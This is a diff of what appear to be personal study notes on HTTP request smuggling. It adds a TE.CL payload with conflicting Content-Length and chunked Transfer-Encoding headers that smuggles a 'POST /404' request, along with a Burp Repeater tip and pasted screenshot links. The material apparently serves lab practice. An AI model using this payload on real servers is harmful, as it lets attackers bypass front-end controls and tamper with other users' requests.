@@ -23,18 +23,29 @@ Sent 2 times. The 2nd time 404
 x= 
 # TE.CL
 
+Repeater --> uncheck Update Content-Length
+
 ```
-Content-Length: 0
+Content-Length: 4
 Transfer-encoding: chunked
 
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
 0
 
-GET /404 HTTP/1.1
-X-Ignore: X
+
 ```
 
-500 Internal Server Error
+![[Pasted image 20240814132824.png]]
 
-Repeater --> uncheck Update Conte
+![[Pasted image 20240814132925.png]]
+
+
+
+
 
 
